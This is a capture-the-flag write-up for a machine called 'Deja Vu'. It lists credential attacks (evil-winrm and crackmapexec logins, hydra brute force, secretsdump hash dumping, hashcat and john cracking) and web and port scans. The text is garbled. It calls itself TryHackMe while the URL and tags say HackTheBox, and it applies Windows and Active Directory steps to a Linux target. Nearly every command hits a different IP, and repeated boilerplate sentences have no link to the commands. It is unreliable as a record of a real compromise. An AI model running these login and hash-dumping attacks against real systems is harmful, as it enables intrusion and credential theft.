---
TitleSEO: "TryHackMe — Deja Vu (Easy Linux) | ZureFX"
TitlePost: "TryHackMe — Deja Vu (Easy Linux)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Deja Vu. DCSync and Writable PATH to achieve easy compromise on Linux."
Keywords: "easy, web, ctf, hackthebox, active directory, offsec, medium"
URL: "https://zurefx.github.io/writeups/htb-deja-vu-482.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-deja-vu-482/"
Date: "2024-12-29"
Tags: "Easy, Web, CTF, HackTheBox, Active Directory, OffSec, Medium"
Section: "writeups"
Lang: "en"
main_img: "htb-deja-vu-482"
Permalink: "/writeups/htb-deja-vu-482.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Deja Vu** is rated **Easy** on TryHackMe. It runs **Linux** and the IP address during this analysis was `10.96.159.92`.

### Objectives

Privilege escalation was possible due to misconfigured sudo permissions. The database credentials were hardcoded in the application source code.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
evil-winrm -i 10.19.147.71 -u administrator -p 'P@ssw0rd!'
```

The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities.

### Service Enumeration

Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible.

```bash
crackmapexec smb 10.75.141.118 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.90.151.220/FUZZ
nmap -sCV -p995,636,636 10.91.29.114 -oN scan.txt
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Web Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

```bash
feroxbuster -h
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.14.163.16 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The kernel version was outdated and vulnerable to a publicly known exploit. Network traffic analysis revealed unencrypted communications containing user credentials.

## Exploitation

### Vulnerability Identification

The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file.

Key finding: **DCSync**.

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files.

### Initial Access

The application stored sensitive credentials in an unencrypted configuration file. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit. Weak file permissions allowed modification of critical system files.

## Privilege Escalation

### Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.69.42.102
gobuster dir -u http://10.79.71.40/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Command injection was possible through unsanitized user input in the search functionality. The application stored sensitive credentials in an unencrypted configuration file.

### Root/SYSTEM

Successfully obtained **root** access on the target.

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

## Summary

### Tools Used

- `wpscan`
- `feroxbuster`
- `impacket`
- `secretsdump`
- `mimikatz`

### Key Takeaways

- DCSync
- Writable PATH
